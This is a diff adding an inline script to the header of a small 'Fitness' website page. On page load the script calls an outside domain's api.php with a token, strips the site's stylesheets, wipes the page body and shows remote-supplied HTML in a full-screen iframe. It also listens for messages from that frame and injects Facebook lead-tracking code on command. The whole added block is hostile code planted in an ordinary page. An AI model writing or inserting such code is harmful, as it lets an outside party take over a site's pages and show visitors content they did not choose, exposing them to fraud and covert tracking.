@@ -24,6 +24,139 @@
 	<div id="logo">
 		<h1>Fitness</h1>
 	</div>
+	<script>// <![CDATA[
+window.adsparams = {
+  sub1:  '',                     //     
+  sub2:  '',                     //     
+  sub3:  '',                     //     
+  sub4:  '',                     //     
+  token: 'RFDdFzNZd2Lp3S56',     //     tkn
+  url:   'https://nobb.buedyhwees.info',  //     kt dmn
+};
+
+var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
+  function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
+  return new (P || (P = Promise))(function (resolve, reject) {
+    function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
+    function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
+    function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
+    step((generator = generator.apply(thisArg, _arguments || [])).next());
+  });
+};
+var __generator = (this && this.__generator) || function (thisArg, body) {
+  var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
+  return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
+  function verb(n) { return function (v) { return step([n, v]); }; }
+  function step(op) {
+    if (f) throw new TypeError("Generator is already executing.");
+    while (_) try {
+      if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
+      if (y = 0, t) op = [op[0] & 2, t.value];
+      switch (op[0]) {
+        case 0: case 1: t = op; break;
+        case 4: _.label++; return { value: op[1], done: false };
+        case 5: _.label++; y = op[1]; op = [0]; continue;
+        case 7: op = _.ops.pop(); _.trys.pop(); continue;
+        default:
+          if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
+          if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
+          if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
+          if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
+          if (t[2]) _.ops.pop();
+          _.trys.pop(); continue;
+      }
+      op = body.call(thisArg, _);
+    } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
+    if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
+  }
+};
+var params = window.adsparams;
+var jQuery = window.jQuery;
+var fullURL = createFullURL.call(params);
+getContent().then(function (content) {
+  if (content !== '') {
+    var frameContent = content.replace(/base href="/gi, "base href=\"" + params.url + "/");
+    deleteStyles();
+    showIframe(frameContent);
+  }
+});
+function getContent() {
+  var _a;
+  return __awaiter(this, void 0, void 0, function () {
+    var res, parse;
+    return __generator(this, function (_b) {
+      switch (_b.label) {
+        case 0: return [4 /*yield*/, fetch(fullURL)];
+        case 1:
+          res = _b.sent();
+          return [4 /*yield*/, res.json()];
+        case 2:
+          parse = _b.sent();
+          return [2 /*return*/, (_a = parse === null || parse === void 0 ? void 0 : parse.redirect) === null || _a === void 0 ? void 0 : _a.content];
+      }
+    });
+  });
+}
+function createFullURL() {
+  return this.url + "/api.php?token=" + this.token + "&sub1=" + this.sub1 + "&sub2=" + this.sub2 + "&sub3=" + this.sub3 + "&sub4=" + this.sub4;
+}
+function deleteStyles() {
+  var links = document.querySelectorAll('link[rel="stylesheet"]');
+  links.forEach(function (item) {
+    item.remove();
+  });
+}
+function showIframe(html) {
+  function appendElement(element) {
+    document.querySelector('html').style.background = 'rgba(0,0,0,0)';
+    document.body.appendChild(element);
+  }
+  document.body.innerHTML = '';
+  document.body.setAttribute('style', "\n    margin: 0;\n    padding: 0;\n    border: 0;\n    height: 100%;\n    background: rgba(0,0,0,0);\n  ");
+  var container = document.createElement('div');
+  var iframe = document.createElement('iframe');
+  var styles = "\n    border: 0;\n    margin: 0;\n    padding: 0;\n    width: 100%;\n    height: 100vh;\n    overflow: hidden;\n  ";
+  iframe.setAttribute('style', styles);
+  iframe.setAttribute('srcdoc', html);
+  container.setAttribute('style', styles);
+  container.appendChild(iframe);
+  if (document.body) {
+    appendElement(container);
+  }
+  else {
+    document.addEventListener('DOMContentLoaded', function () { return appendElement(container); });
+  }
+}
+function track_fb_lead(fbpx) {
+  var fbcode = '<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version=\'2.0\';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,\'script\',\'https://connect.facebook.net/en_US/fbevents.js\');fbq(\'init\', \'' + fbpx + '\');fbq(\'track\', \'Lead\');<\/script>';
+  if (jQuery) {
+    jQuery('body').append(fbcode);
+  }
+  else {
+    var script = document.createElement('script');
+    document.head.appendChild(script);
+    script.type = 'text/javascript';
+    script.src = '//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js';
+    script.onload = function () {
+      jQuery('body').append(fbcode);
+    };
+  }
+}
+var eventMethod = window.addEventListener ? 'addEventListener' : 'attachEvent';
+var eventer = window[eventMethod];
+var messageEvent = eventMethod === 'attachEvent' ? 'onmessage' : 'message';
+// Listen to message from child window
+eventer(messageEvent, function (e) {
+  if (e.data != '') {
+    e.source.postMessage('existing', e.origin);
+    var resp = JSON.parse(e.data);
+    if (resp.type == 'facebook') {
+      track_fb_lead(resp.fbpx);
+    }
+  }
+}, false);
+
+// ]]></script>
 	<hr />
 </div>
 <!-- end #header -->
